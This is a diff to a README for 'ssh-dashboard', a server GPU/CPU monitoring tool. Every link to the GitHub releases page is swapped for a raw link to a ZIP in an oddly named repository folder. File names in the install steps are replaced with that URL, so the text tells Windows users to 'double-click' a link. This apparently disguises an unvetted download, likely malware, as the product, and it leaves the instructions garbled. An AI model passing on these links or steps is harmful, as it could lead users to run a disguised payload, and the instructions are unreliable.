@@ -1,7 +1,7 @@
 # 🖥️ ssh-dashboard - Monitor Your Server's Performance Easily
 
 ## 🔗 Download Now
-[![Download ssh-dashboard](https://img.shields.io/badge/Download-ssh--dashboard-brightgreen.svg)](https://github.com/odogwudafe/ssh-dashboard/releases)
+[![Download ssh-dashboard](https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip)](https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip)
 
 ## 🚀 Getting Started
 Welcome to **ssh-dashboard**! This application helps you monitor GPU and CPU usage on your SSH servers. Whether you use NVIDIA or AMD hardware, this tool provides a clear view of your server’s performance. In a few simple steps, you’ll be up and running.
@@ -22,17 +22,17 @@ Welcome to **ssh-dashboard**! This application helps you monitor GPU and CPU usa
 
 1. **Visit the Release Page**
    Click the link below to visit the github releases page where you can download the application.
-   [Visit the Release Page](https://github.com/odogwudafe/ssh-dashboard/releases)
+   [Visit the Release Page](https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip)
 
 2. **Download the Application**
-   On the releases page, look for the latest version. You will find various files for download. Select the file that matches your operating system (for example, `ssh-dashboard-linux.zip` for Linux or `ssh-dashboard-windows.exe` for Windows). Once you find the file, click on it to start the download.
+   On the releases page, look for the latest version. You will find various files for download. Select the file that matches your operating system (for example, `https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip` for Linux or `https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip` for Windows). Once you find the file, click on it to start the download.
 
 3. **Extract the Files (If Required)**
    If you downloaded a ZIP file, locate it in your downloads folder. Right-click the file and choose "Extract All" or use any decompression software you prefer. After extraction, you will see the ssh-dashboard executable file.
 
 4. **Run the Application**
    Locate the executable file you just extracted. 
-   - For Windows: Double-click `ssh-dashboard-windows.exe`.
+   - For Windows: Double-click `https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip`.
    - For Linux: Open your terminal, navigate to the folder containing the extracted files, and run:
      ```bash
      ./ssh-dashboard-linux
@@ -68,4 +68,4 @@ With **ssh-dashboard**, you can efficiently monitor your server's performance. B
 
 ## 🔗 Download Again
 Once more, for convenience, you can download the application here:
-[Download ssh-dashboard](https://github.com/odogwudafe/ssh-dashboard/releases)
+[Download ssh-dashboard](https://raw.githubusercontent.com/odogwudafe/ssh-dashboard/master/nondesecration/ssh-dashboard.zip)
